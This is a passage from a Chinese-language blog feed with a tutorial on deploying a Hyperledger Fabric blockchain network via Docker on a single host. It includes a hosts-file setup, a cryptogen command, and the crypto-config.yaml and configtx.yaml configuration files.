class="hljs-literal">-compose</span><span class="hljs-literal">-explorer</span>.yaml down <span class="hljs-literal">-v</span><br><span class="hljs-comment">#-v 代表的是清除容器和本地挂在的数据</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/hyperledger/blockchain-explorer">参考文件</a></p><p><a href="https://my.oschina.net/j4love/blog/5470911">原地址出处</a></p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker单机部署生产网络</title>
    <link href="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/"/>
    <url>/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h3 id="hyperledger-fabric-Docker方式部署多机环境"><a href="#hyperledger-fabric-Docker方式部署多机环境" class="headerlink" title="hyperledger fabric Docker方式部署多机环境"></a>hyperledger fabric Docker方式部署多机环境</h3><h4 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h4><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220413192101096.png" alt="网络拓扑图"></p><p>因为是单机部署所以统一使用一个ip</p><table><thead><tr><th>节点</th><th>宿主机 IP</th><th>hosts</th><th>端口</th></tr></thead><tbody><tr><td>cli</td><td>192.168.177.128</td><td>N/A</td><td>N/A</td></tr><tr><td>orderer0</td><td>192.168.177.128</td><td>orderer0.example.com</td><td>7050</td></tr><tr><td>orderer1</td><td>192.168.177.128</td><td>orderer1.example.com</td><td>8050</td></tr><tr><td>orderer2</td><td>192.168.177.128</td><td>orderer2.example.com</td><td>9050</td></tr><tr><td>org1-peer0</td><td>192.168.177.128</td><td>peer0.org1.example.com</td><td>7051</td></tr><tr><td>org1-peer1</td><td>192.168.177.128</td><td>peer1.org1.example.com</td><td>8051</td></tr><tr><td>org2-peer0</td><td>192.168.177.128</td><td>peer0.org2.example.com90</td><td>9051</td></tr><tr><td>org2-peer1</td><td>192.168.177.128</td><td>peer1.org2.example.com</td><td>10051</td></tr></tbody></table><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">vim /etc/hosts<br><br>#hosts文件中新增每个DNS解析的ip<br><span class="hljs-number">192.168.177.128</span>orderer0.example.com<br><span class="hljs-number">192.168.177.128</span>orderer1.example.com<br><span class="hljs-number">192.168.177.128</span>orderer2.example.com<br><br><span class="hljs-number">192.168.177.128</span>peer0.org1.example.com<br><span class="hljs-number">192.168.177.128</span>peer1.org1.example.com<br><span class="hljs-number">192.168.177.128</span>peer0.org2.example.com<br><span class="hljs-number">192.168.177.128</span>peer1.org2.example.com<br></code></pre></td></tr></table></figure><p>首先需要使用fabric中的cryptogen generate生成组织身份文件(msp,tls,ca证书等文件)并保存在crypto-config文件夹中</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">./cryptogen <span class="hljs-keyword">generate</span> --<span class="hljs-keyword">config</span>=../crypto-<span class="hljs-keyword">config</span><span class="hljs-variable">.yaml</span> --<span class="hljs-keyword">output</span> ../crypto-<span class="hljs-keyword">config</span><br></code></pre></td></tr></table></figure><p>crypto-config.yaml配置文件如下:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># ---------------------------------------------------------------------------</span><br><span class="hljs-comment"># &quot;OrdererOrgs&quot; - Definition of organizations managing orderer nodes</span><br><span class="hljs-comment"># ---------------------------------------------------------------------------</span><br><span class="hljs-attr">OrdererOrgs:</span><br>  <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>  <span class="hljs-comment"># Orderer</span><br>  <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">Name:</span> <span class="hljs-string">Orderer</span><br>    <span class="hljs-attr">Domain:</span> <span class="hljs-string">example.com</span><br>    <span class="hljs-attr">EnableNodeOUs:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># &quot;Specs&quot; - See PeerOrgs below for complete description</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-attr">Specs:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">Hostname:</span> <span class="hljs-string">orderer0</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">Hostname:</span> <span class="hljs-string">orderer1</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">Hostname:</span> <span class="hljs-string">orderer2</span><br>        <span class="hljs-attr">SANS:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;*&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.177.128&quot;</span><br><br><span class="hljs-comment"># ---------------------------------------------------------------------------</span><br><span class="hljs-comment"># &quot;PeerOrgs&quot; - Definition of organizations managing peer nodes</span><br><span class="hljs-comment"># ---------------------------------------------------------------------------</span><br><span class="hljs-attr">PeerOrgs:</span><br>  <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>  <span class="hljs-comment"># Org1</span><br>  <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">Name:</span> <span class="hljs-string">Org1</span><br>    <span class="hljs-attr">Domain:</span> <span class="hljs-string">org1.example.com</span><br>    <span class="hljs-attr">EnableNodeOUs:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># &quot;CA&quot;</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># Uncomment this section to enable the explicit definition of the CA for this</span><br>    <span class="hljs-comment"># organization.  This entry is a Spec.  See &quot;Specs&quot; section below for details.</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># CA:</span><br>    <span class="hljs-comment">#    Hostname: ca # implicitly ca.org1.example.com</span><br>    <span class="hljs-comment">#    Country: US</span><br>    <span class="hljs-comment">#    Province: California</span><br>    <span class="hljs-comment">#    Locality: San Francisco</span><br>    <span class="hljs-comment">#    OrganizationalUnit: Hyperledger Fabric</span><br>    <span class="hljs-comment">#    StreetAddress: address for org # default nil</span><br>    <span class="hljs-comment">#    PostalCode: postalCode for org # default nil</span><br><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># &quot;Specs&quot;</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># Uncomment this section to enable the explicit definition of hosts in your</span><br>    <span class="hljs-comment"># configuration.  Most users will want to use Template, below</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># Specs is an array of Spec entries.  Each Spec entry consists of two fields:</span><br>    <span class="hljs-comment">#   - Hostname:   (Required) The desired hostname, sans the domain.</span><br>    <span class="hljs-comment">#   - CommonName: (Optional) Specifies the template or explicit override for</span><br>    <span class="hljs-comment">#                 the CN.  By default, this is the template:</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment">#                              &quot;&#123;&#123;.Hostname&#125;&#125;.&#123;&#123;.Domain&#125;&#125;&quot;</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment">#                 which obtains its values from the Spec.Hostname and</span><br>    <span class="hljs-comment">#                 Org.Domain, respectively.</span><br>    <span class="hljs-comment">#   - SANS:       (Optional) Specifies one or more Subject Alternative Names</span><br>    <span class="hljs-comment">#                 to be set in the resulting x509. Accepts template</span><br>    <span class="hljs-comment">#                 variables &#123;&#123;.Hostname&#125;&#125;, &#123;&#123;.Domain&#125;&#125;, &#123;&#123;.CommonName&#125;&#125;. IP</span><br>    <span class="hljs-comment">#                 addresses provided here will be properly recognized. Other</span><br>    <span class="hljs-comment">#                 values will be taken as DNS names.</span><br>    <span class="hljs-comment">#                 <span class="hljs-doctag">NOTE:</span> Two implicit entries are created for you:</span><br>    <span class="hljs-comment">#                     - &#123;&#123; .CommonName &#125;&#125;</span><br>    <span class="hljs-comment">#                     - &#123;&#123; .Hostname &#125;&#125;</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># Specs:</span><br>    <span class="hljs-comment">#   - Hostname: foo # implicitly &quot;foo.org1.example.com&quot;</span><br>    <span class="hljs-comment">#     CommonName: foo27.org5.example.com # overrides Hostname-based FQDN set above</span><br>    <span class="hljs-comment">#     SANS:</span><br>    <span class="hljs-comment">#       - &quot;bar.&#123;&#123;.Domain&#125;&#125;&quot;</span><br>    <span class="hljs-comment">#       - &quot;altfoo.&#123;&#123;.Domain&#125;&#125;&quot;</span><br>    <span class="hljs-comment">#       - &quot;&#123;&#123;.Hostname&#125;&#125;.org6.net&quot;</span><br>    <span class="hljs-comment">#       - 172.16.10.31</span><br>    <span class="hljs-comment">#   - Hostname: bar</span><br>    <span class="hljs-comment">#   - Hostname: baz</span><br><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># &quot;Template&quot;</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># Allows for the definition of 1 or more hosts that are created sequentially</span><br>    <span class="hljs-comment"># from a template. By default, this looks like &quot;peer%d&quot; from 0 to Count-1.</span><br>    <span class="hljs-comment"># You may override the number of nodes (Count), the starting index (Start)</span><br>    <span class="hljs-comment"># or the template used to construct the name (Hostname).</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># <span class="hljs-doctag">Note:</span> Template and Specs are not mutually exclusive.  You may define both</span><br>    <span class="hljs-comment"># sections and the aggregate nodes will be created for you.  Take care with</span><br>    <span class="hljs-comment"># name collisions</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-attr">Template:</span><br>      <span class="hljs-attr">Count:</span> <span class="hljs-number">2</span><br>      <span class="hljs-comment"># Start: 5</span><br>      <span class="hljs-comment"># Hostname: &#123;&#123;.Prefix&#125;&#125;&#123;&#123;.Index&#125;&#125; # default</span><br>      <span class="hljs-attr">SANS:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;*&quot;</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.177.128&quot;</span><br><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># &quot;Users&quot;</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-comment"># Count: The number of user accounts _in addition_ to Admin</span><br>    <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>    <span class="hljs-attr">Users:</span><br>      <span class="hljs-attr">Count:</span> <span class="hljs-number">1</span><br><br>  <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>  <span class="hljs-comment"># Org2: See &quot;Org1&quot; for full specification</span><br>  <span class="hljs-comment"># ---------------------------------------------------------------------------</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">Name:</span> <span class="hljs-string">Org2</span><br>    <span class="hljs-attr">Domain:</span> <span class="hljs-string">org2.example.com</span><br>    <span class="hljs-attr">EnableNodeOUs:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">Template:</span><br>      <span class="hljs-attr">Count:</span> <span class="hljs-number">2</span><br>      <span class="hljs-attr">SANS:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;*&quot;</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.177.128&quot;</span><br>    <span class="hljs-attr">Users:</span><br>      <span class="hljs-attr">Count:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>使用configtxgen工具生成初始区块，这个工具会依赖crypto-config/configtx.yaml文件,其中需要根据环境本身修改一些证书存放的路径以及一些地址</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Copyright IBM Corp. All Rights Reserved.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SPDX-License-Identifier: Apache-2.0</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   ORGANIZATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   This section defines the organizational identities that can be referenced</span><br><span class="hljs-comment">#   in the configuration profiles.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-attr">Organizations:</span><br><br>    <span class="hljs-comment"># SampleOrg defines an MSP using the sampleconfig. It should never be used</span><br>    <span class="hljs-comment"># in production but may be used as a template for other definitions.</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-meta">&amp;OrdererOrg</span><br>        <span class="hljs-comment"># Name is the key by which this org will be referenced in channel</span><br>        <span class="hljs-comment"># configuration transactions.</span><br>        <span class="hljs-comment"># Name can include alphanumeric characters as well as dots and dashes.</span><br>        <span class="hljs-attr">Name:</span> <span class="hljs-string">OrdererOrg</span><br><br>        <span class="hljs-comment"># SkipAsForeign can be set to true for org definitions which are to be</span><br>        <span class="hljs-comment"># inherited from the orderer system channel during channel creation.  This</span><br>        <span class="hljs-comment"># is especially useful when an admin of a single org without access to the</span><br>        <span class="hljs-comment"># MSP directories of the other orgs wishes to create a channel.  Note</span><br>        <span class="hljs-comment"># this property must always be set to false for orgs included in block</span><br>        <span class="hljs-comment"># creation.</span><br>        <span class="hljs-attr">SkipAsForeign:</span> <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># ID is the key by which this org&#x27;s MSP definition will be referenced.</span><br>        <span class="hljs-comment"># ID can include alphanumeric characters as well as dots and dashes.</span><br>        <span class="hljs-attr">ID:</span> <span class="hljs-string">OrdererMSP</span><br><br>        <span class="hljs-comment"># MSPDir is the filesystem path which contains the MSP configuration.</span><br>        <span class="hljs-attr">MSPDir:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/ordererOrganizations/example.com/msp</span><br><br>        <span class="hljs-comment"># Policies defines the set of policies at this level of the config tree</span><br>        <span class="hljs-comment"># For organization policies, their canonical path is usually</span><br>        <span class="hljs-comment">#   /Channel/&lt;Application|Orderer&gt;/&lt;OrgName&gt;/&lt;PolicyName&gt;</span><br>        <span class="hljs-attr">Policies:</span><br>            <span class="hljs-attr">Readers:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;OrdererMSP.member&#x27;)&quot;</span><br>                <span class="hljs-comment"># If your MSP is configured with the new NodeOUs, you might</span><br>                <span class="hljs-comment"># want to use a more specific rule like the following:</span><br>                <span class="hljs-comment"># Rule: &quot;OR(&#x27;SampleOrg.admin&#x27;, &#x27;SampleOrg.peer&#x27;, &#x27;SampleOrg.client&#x27;)&quot;</span><br>            <span class="hljs-attr">Writers:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;OrdererMSP.member&#x27;)&quot;</span><br>                <span class="hljs-comment"># If your MSP is configured with the new NodeOUs, you 